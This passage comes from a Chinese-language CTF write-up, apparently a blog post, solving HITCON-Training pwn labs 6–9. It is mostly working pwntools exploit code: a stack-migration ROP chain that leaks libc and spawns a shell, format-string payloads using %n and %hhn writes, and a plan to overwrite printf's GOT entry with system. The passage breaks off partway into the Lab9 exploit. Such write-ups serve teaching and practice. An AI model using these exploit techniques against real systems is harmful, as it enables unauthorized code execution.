/home/liwc/pwn/HITCON-Training/LAB/lab6/migration</span><br><span class=\"line\">0x0804a000 0x0804b000 0x00001000 rw- /home/liwc/pwn/HITCON-Training/LAB/lab6/migration</span><br><span class=\"line\">0xf7dfe000 0xf7dff000 0x00000000 rw- </span><br><span class=\"line\">0xf7dff000 0xf7faf000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so</span><br><span class=\"line\">0xf7faf000 0xf7fb1000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so</span><br><span class=\"line\">0xf7fb1000 0xf7fb2000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so</span><br><span class=\"line\">0xf7fb2000 0xf7fb5000 0x00000000 rw- </span><br><span class=\"line\">0xf7fd3000 0xf7fd4000 0x00000000 rw- </span><br><span class=\"line\">0xf7fd4000 0xf7fd7000 0x00000000 r-- [vvar]</span><br><span class=\"line\">0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]</span><br><span class=\"line\">0xf7fd9000 0xf7ffc000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so</span><br><span class=\"line\">0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib/i386-linux-gnu/ld-2.23.so</span><br><span class=\"line\">0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib/i386-linux-gnu/ld-2.23.so</span><br><span class=\"line\">0xfffdd000 0xffffe000 0x00000000 rw- [stack]</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><h4 id=\"1-将fake-frame写到RW段\"><a href=\"#1-将fake-frame写到RW段\" class=\"headerlink\" title=\"1.将fake_frame写到RW段\"></a>1.将fake_frame写到RW段</h4><p>执行两次leave ret跳转到rwadddr</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(rwaddr) <span class=\"comment\"># fake ebp</span></span><br><span class=\"line\">rop += p32(read_plt) <span class=\"comment\"># retn_addr</span></span><br><span class=\"line\">rop += p32(leaveret) <span class=\"comment\"># retn_addr of read</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>) <span class=\"comment\"># arg1</span></span><br><span class=\"line\">rop += p32(rwaddr) <span class=\"comment\"># arg2</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0x100</span>) <span class=\"comment\"># arg3</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"2-leak-libc\"><a href=\"#2-leak-libc\" class=\"headerlink\" title=\"2.leak libc\"></a>2.leak libc</h4><p>执行两次leave ret跳转到rwaddr+0x100</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rop += p32(rwaddr + <span class=\"number\">0x100</span>) <span class=\"comment\"># fake ebp</span></span><br><span class=\"line\">rop += p32(puts_plt) <span class=\"comment\"># retn_addr</span></span><br><span class=\"line\">rop += p32(pop1) <span class=\"comment\"># adjust stack to next part chain of rop</span></span><br><span class=\"line\">rop += p32(elf.got[<span class=\"string\">'__libc_start_main'</span>]) <span class=\"comment\"># arg1</span></span><br><span class=\"line\">rop += p32(read_plt) <span class=\"comment\"># call read</span></span><br><span class=\"line\">rop += p32(leaveret) <span class=\"comment\"># retn_addr of read</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>) <span class=\"comment\"># arg1</span></span><br><span class=\"line\">rop += p32(rwaddr + <span class=\"number\">0x100</span>) <span class=\"comment\"># arg2</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0x100</span>) <span class=\"comment\"># arg3</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"3-RCE\"><a href=\"#3-RCE\" class=\"headerlink\" title=\"3.RCE\"></a>3.RCE</h4><p>rwaddr+0x100处直接getshell</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rop = p32(rwaddr)</span><br><span class=\"line\">rop += p32(system)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0xdeadbeef</span>)</span><br><span class=\"line\">rop += p32(binsh)</span><br></pre></td></tr></table></figure>\n<p>完整exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./migration\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./migration\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">0x28</span></span><br><span class=\"line\">popebp = <span class=\"number\">0x0804856b</span></span><br><span class=\"line\">ret = <span class=\"number\">0x08048356</span></span><br><span class=\"line\">leaveret = <span class=\"number\">0x08048418</span></span><br><span class=\"line\">rwaddr = <span class=\"number\">0x0804b000</span><span class=\"number\">-0x300</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0804836d : pop ebx ; ret</span></span><br><span class=\"line\">pop1 = <span class=\"number\">0x0804836d</span></span><br><span class=\"line\">read_plt = elf.plt[<span class=\"string\">'read'</span>]</span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\" :\\n\"</span>)</span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(rwaddr) <span class=\"comment\"># fake ebp</span></span><br><span class=\"line\">rop += p32(read_plt) <span class=\"comment\"># retn addr</span></span><br><span class=\"line\">rop += p32(leaveret) <span class=\"comment\"># retn addr of read</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>) <span class=\"comment\"># arg1</span></span><br><span class=\"line\">rop += p32(rwaddr) <span class=\"comment\"># arg2</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">100</span>) <span class=\"comment\"># arg3</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(rop)</span><br><span class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</span><br><span class=\"line\">sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></span><br><span class=\"line\">rop = p32(rwaddr + <span class=\"number\">0x100</span>) <span class=\"comment\"># fake ebp</span></span><br><span class=\"line\">rop += p32(puts_plt) <span class=\"comment\"># retn addr</span></span><br><span class=\"line\">rop += p32(pop1) <span class=\"comment\"># retn addr of puts_plt</span></span><br><span class=\"line\">rop += p32(elf.got[<span class=\"string\">'__libc_start_main'</span>])</span><br><span class=\"line\">rop += p32(read_plt) <span class=\"comment\"># after pop 1</span></span><br><span class=\"line\">rop += p32(leaveret)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>) <span class=\"comment\"># arg1</span></span><br><span class=\"line\">rop += p32(rwaddr + <span class=\"number\">0x100</span>) <span class=\"comment\">#arg2</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">100</span>) <span class=\"comment\">#arg2</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u32(p.recvline()[:<span class=\"number\">4</span>])</span><br><span class=\"line\">libc.address = addr - libc.symbols[<span class=\"string\">'__libc_start_main'</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">binsh = next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">rop = p32(rwaddr)</span><br><span class=\"line\">rop += p32(system)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0xdeadbeef</span>)</span><br><span class=\"line\">rop += p32(binsh)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab7——Crack\"><a href=\"#Lab7——Crack\" class=\"headerlink\" title=\"Lab7——Crack\"></a>Lab7——Crack</h2><h3 id=\"防护-5\"><a href=\"#防护-5\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>开了canary，栈利用应该比较困难。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab7$ checksec crack</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab7/crack&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-5\"><a href=\"#分析-5\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>该题是典型的格式化字符串利用，将bss段的全局变量passwprd覆盖为已知值即可。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v3; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> fd; <span class=\"comment\">// ST14_4</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> nptr; <span class=\"comment\">// [esp+8h] [ebp-80h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [esp+18h] [ebp-70h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v8; <span class=\"comment\">// [esp+7Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v8 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  setvbuf(_bss_start, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  v3 = time(<span class=\"number\">0</span>);</span><br><span class=\"line\">  srand(v3);</span><br><span class=\"line\">  fd = open(<span class=\"string\">\"/dev/urandom\"</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  read(fd, &amp;password, <span class=\"number\">4u</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"What your name ? \"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">0x63</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Hello ,\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(&amp;buf);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Your password :\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;nptr, <span class=\"number\">0xF</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( atoi(&amp;nptr) == password )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Congrt!!\"</span>);</span><br><span class=\"line\">    system(<span class=\"string\">\"cat /home/crack/flag\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Goodbyte\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用-1\"><a href=\"#利用-1\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>首先测得 or 调试得到格式化字符串在栈中的偏移为10，然后布置<code>target_addr%10$n</code>的格式化字符串，向target_addr写入4。然后输入4即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./crack\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./crack\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"? \"</span>)</span><br><span class=\"line\">payload = p32(<span class=\"number\">0x804a048</span>)</span><br><span class=\"line\">payload += <span class=\"string\">\"%10$n\"</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.sendafter(<span class=\"string\">\":\"</span>, <span class=\"string\">\"4\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>效果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Congrt!!</span><br><span class=\"line\">cat: /home/crack/flag: No such file or directory</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab8——craxme\"><a href=\"#Lab8——craxme\" class=\"headerlink\" title=\"Lab8——craxme\"></a>Lab8——craxme</h2><h3 id=\"防护-6\"><a href=\"#防护-6\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab8$ checksec craxme</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab8/craxme&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-6\"><a href=\"#分析-6\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>和Lab7相似，也是fmt的利用，分别向目标地址写入218和0xFACEB00C，前者直接写即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./craxme\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./craxme\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">payload = p32(<span class=\"number\">0x804a038</span>)</span><br><span class=\"line\">payload += (<span class=\"number\">218</span> - <span class=\"number\">4</span>) * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"%7$n\"</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>后者需要有一定的构造。首先，由于是小端存储，要向内存中写4个byte的数据，只要用<code>$hhn</code>分别向单字节写即可。如要想写入0x12345678，相当于分别向target_addr ~ target_addr + 3的地址写入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x78</span><br><span class=\"line\">0x56</span><br><span class=\"line\">0x34</span><br><span class=\"line\">0x12</span><br></pre></td></tr></table></figure>\n<p>首先将地址放在栈中，然后计算应该padding多少个字节，最后用hhn写入。注意取余</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./craxme\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./craxme\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">target_addr = <span class=\"number\">0x804a038</span></span><br><span class=\"line\">target = <span class=\"number\">0xFACEB00C</span></span><br><span class=\"line\">payload = p32(target_addr) + p32(target_addr + <span class=\"number\">1</span>) + p32(target_addr + <span class=\"number\">2</span>) + p32(target_addr + <span class=\"number\">3</span>)</span><br><span class=\"line\">payload += <span class=\"string\">\"%\"</span> + str((<span class=\"number\">0x0c</span> - len(payload)) % <span class=\"number\">256</span>) + <span class=\"string\">\"c%7$hhn\"</span></span><br><span class=\"line\">payload += <span class=\"string\">\"%\"</span> + str((<span class=\"number\">0xb0</span> - <span class=\"number\">0x0c</span>) &amp; <span class=\"number\">0xff</span>)  + <span class=\"string\">\"c%8$hhn\"</span></span><br><span class=\"line\">payload += <span class=\"string\">\"%\"</span> + str((<span class=\"number\">0xce</span> - <span class=\"number\">0xb0</span>) &amp; <span class=\"number\">0xff</span>)  + <span class=\"string\">\"c%9$hhn\"</span></span><br><span class=\"line\">payload += <span class=\"string\">\"%\"</span> + str((<span class=\"number\">0xfa</span> - <span class=\"number\">0xce</span>) &amp; <span class=\"number\">0xff</span>)  + <span class=\"string\">\"c%10$hhn\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab9——playfmt\"><a href=\"#Lab9——playfmt\" class=\"headerlink\" title=\"Lab9——playfmt\"></a>Lab9——playfmt</h2><h3 id=\"防护-7\"><a href=\"#防护-7\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab9$ checksec playfmt</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab9/playfmt&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-7\"><a href=\"#分析-7\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>也是格式化字符串的利用，每次向bss段上读入0xc8的格式化字符串，然后printf，当读入quit时，退出。</p>\n<p>显然，因为格式化字符串不在栈上，所以处理起来有些麻烦，首先可以看到相对偏移为15的位置有一个libc上的地址，将它leak出来获得libc基地址。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  dereference $esp</span><br><span class=\"line\">0xffffcf0c│+0x0000: 0x08048540  →  &lt;do_fmt+69&gt; add esp, 0x10\t ← $esp</span><br><span class=\"line\">0xffffcf10│+0x0004: 0x0804a060  →  &quot;AAAA%p%p%p%p%p%p%p%p%p&quot;</span><br><span class=\"line\">0xffffcf14│+0x0008: 0x08048640  →  &quot;quit&quot;</span><br><span class=\"line\">0xffffcf18│+0x000c: 0x00000004</span><br><span class=\"line\">0xffffcf1c│+0x0010: 0x0804857c  →  &lt;play+51&gt; add esp, 0x10 </span><br><span class=\"line\">0xffffcf20│+0x0014: 0x08048645  →  &quot;=====================&quot;</span><br><span class=\"line\">0xffffcf24│+0x0018: 0xf7fb1000  →  0x001b1db0</span><br><span class=\"line\">0xffffcf28│+0x001c: 0xffffcf38  →  0xffffcf48  →  0x00000000\t ← $ebp &lt;= ebp1 7</span><br><span class=\"line\">0xffffcf2c│+0x0020: 0x08048584  →  &lt;play+59&gt; nop &lt;= 8</span><br><span class=\"line\">0xffffcf30│+0x0024: 0xf7fb1d60  →  0xfbad2887</span><br><span class=\"line\">gef➤  dereference $esp</span><br><span class=\"line\">0xffffcf34│+0x0028: 0x00000000</span><br><span class=\"line\">0xffffcf38│+0x002c: 0xffffcf48  →  0x00000000 &lt;= ebp2 11</span><br><span class=\"line\">0xffffcf3c│+0x0030: 0x080485b1  →  &lt;main+42&gt; nop &lt;= 12</span><br><span class=\"line\">0xffffcf40│+0x0034: 0xf7fb13dc  →  0xf7fb21e0  →  0x00000000</span><br><span class=\"line\">0xffffcf44│+0x0038: 0xffffcf60  →  0x00000001</span><br><span class=\"line\">0xffffcf48│+0x003c: 0x00000000</span><br><span class=\"line\">0xffffcf4c│+0x0040: 0xf7e17637  →  &lt;__libc_start_main+247&gt; add esp, 0x10</span><br></pre></td></tr></table></figure>\n<p>但是，也因为fmt string不在栈上，想要任意地址写则比较困难，这里参考了Vidar-Team某师傅的题解（<a href=\"https://veritas501.space/2017/05/23/HITCON-training%20writeup/\" target=\"_blank\" rel=\"noopener\">https://veritas501.space/2017/05/23/HITCON-training%20writeup/</a>），利用栈中ebp的相对偏移已知的特点。我们可以看到0xffffcf28处ebp指向0xffffcf38处，而0xffffcf38处指向0xffffcf48处。</p>\n<p>这里有几个需要注意的点：</p>\n<ul>\n<li>首先我们需要leak栈地址，才能利用格式化字符串漏洞进行写入，通过”%6$x”将ebp1处存的ebp2的栈地址leak出来，然后根据相对偏移算出ebp1、nop1、nop2的地址。</li>\n<li>如果我们修改ebp1，就相当于向ebp2的地址写，再修改ebp2，也就相当于往任意地址写。</li>\n<li>注意到栈地址只有低2个字节不同，所以用hn写入低两个字节即可修改ebp1处和ebp2处的地址。</li>\n<li>我们想要劫持got表，将printf@got修改为system。由Lab8可以知道，想写入一个大整数，直接写4个byte是不行的，所以在这里我们分开写，两个byte两个byte的写：将nop1修改为printf@got的地址，将nop2修改为printf@got + 2的地址，然后用%c$hn写入即可。</li>\n</ul>\n<h3 id=\"利用-2\"><a href=\"#利用-2\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>完整的exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span 